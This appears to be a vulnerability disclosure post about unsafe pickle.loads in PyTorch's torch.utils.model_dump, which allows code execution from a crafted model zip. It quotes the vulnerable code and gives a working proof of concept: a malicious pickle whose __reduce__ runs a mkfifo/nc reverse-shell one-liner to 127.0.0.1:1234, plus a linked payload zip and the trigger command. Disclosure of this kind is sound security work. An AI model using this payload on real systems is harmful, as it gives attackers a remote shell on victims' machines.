---
layout: post
title:  "Command injection via unsafe pickle.loads in torch.utils.model_dump"
date:  2024-06-24 10:31:06 +0800
categories: command-injection
---

## Name

> Command injection via unsafe pickle.loads in torch.utils.model_dump

## Weakness

> CWE-94: Code Injection

## Severity

> High (8.8)

## Version

> 2.3.1

## Description

In pytorch module [`torch.utils.model_dump`](https://github.com/pytorch/pytorch/blob/main/torch/utils/model_dump/__init__.py), the method [`get_model_info`](https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L189) is responsible for extracting a model data in zip file. However, during the extraction, if a pickle file endswith `debug_pkl`, this file will be parsed by [`pickle.loads` function](https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264). In this case, if a [malicous pickle file is parsed](https://book.hacktricks.xyz/pentesting-web/deserialization#pickle), we can achive command injection in victim's mechine.

The vulnerable function: [`get_model_info`](https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264)

```
def get_model_info(
        path_or_file,
        title=None,
        extra_file_size_limit=DEFAULT_EXTRA_FILE_SIZE_LIMIT):
    """Get JSON-friendly information about a model.

    The result is suitable for being saved as model_info.json,
    or passed to burn_in_info.
    """
    ...
    with zipfile.ZipFile(path_or_file) as zf:
        
        code_files = {}
        for zi in zf.infolist():
            if not zi.filename.endswith(".py"):
                continue
            with zf.open(zi) as handle:
                raw_code = handle.read()
            with zf.open(zi.filename + ".debug_pkl") as handle:
                raw_debug = handle.read()

            # Parse debug info and add begin/end markers if not present
            # to ensure that we cover the entire source code.
            # vulnerable sink!!!!!!!!!!
            debug_info_t = pickle.loads(raw_debug)
            
    ...
    return {"model": dict(
        title=title,
        file_size=file_size,
        version=version,
        zip_files=zip_files,
        interned_strings=list(interned_strings),
        code_files=code_files,
        model_data=model_data,
        constants=constants,
        extra_files_jsons=extra_files_jsons,
        extra_pickles=extra_pickles,
    )}
```

## Proof of Concept

Firstly, let's create a malicous model, and compress it with zip format. In [`get_model_info#L230`](https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L230), we know the model directory must contain `version` file. In [`get_model_info#L238`](https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L238), we know the model directory must contain `data.pkl` and `constants.pkl` files. In line [`get_model_info#L255`](https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L255) and line [`get_model_info#L259`](https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L259), we know that the model must contain a python file and a `debug_pkl` file. So, let's create those files:

### `version`

```
1.1.0
```

### `data.pkl` and `constants.pkl`

Use following snippets to create `data.pkl` file:

```
import pickle
student_names = [1]
with open('data.pkl', 'wb') as f:
    pickle.dump(student_names, f)
```

Use following snippets to create `constants.pkl` file:

```
import pickle
student_names = ["df"]
with open('constants.pkl', 'wb') as f:
    pickle.dump(student_names, f)
```

### `payload.py`

Just create a empty file named `payload.py`

### `payload.py.debug_pkl`

Use following snippets to create a malicous pickle payload:

```
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

with open('payload.py.debug_pkl', 'wb') as f:
    pickle.dump(RCE(), f)
```

### malicious model zip file

Copy all the files to a folder and create a model zipfile:

```
> ls -la torch-model-dump
-rw-r--r-- 1 kali kali   20 Jun 24 17:45 constants.pkl
-rw-r--r-- 1 kali kali   17 Jun 24 17:45 data.pkl
-rw-r--r-- 1 kali kali    0 Jun 24 17:45 payload.py
-rw-r--r-- 1 kali kali  121 Jun 24 17:45 payload.py.debug_pkl
-rw-r--r-- 1 kali kali    6 Jun 24 17:39 version

> zip -r torch-model-dump.zip torch-model-dump
```

The [`torch-model-dump.zip`](https://raw.githubusercontent.com/sunriseXu/onnx/main/torch-model-dump.zip) can be download from github.

## Start attack

Use following command to trigger the unsafe `pickle.loads` command injection:

```
python -m torch.utils.model_dump --style=json ./torch-model-dump.zip
```

After the command executed, we can check the `/tmp/f` file is created.

```
> ls -la /tmp/f
prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
```
## Colab

Tested on google colab: [https://colab.research.google.com/drive/1jKXmbFS4EcpwfYn1UXeKPFNV-dB3VtIs?usp=sharing](https://colab.research.google.com/drive/1jKXmbFS4EcpwfYn1UXeKPFNV-dB3VtIs?usp=sharing)

![image](/assets/images/bughunter/torch-pickle.png)

## Impact

This vulnerability can have severe consequences. If victims parse an malicious model file using `torch.utils.model_dump`, command injection can be achieved.


## Occurrences

[get_model_info#L264](https://github.com/pytorch/pytorch/blob/d21f311af880c736b18b5a588583f6162e9abcfa/torch/utils/model_dump/__init__.py#L264)

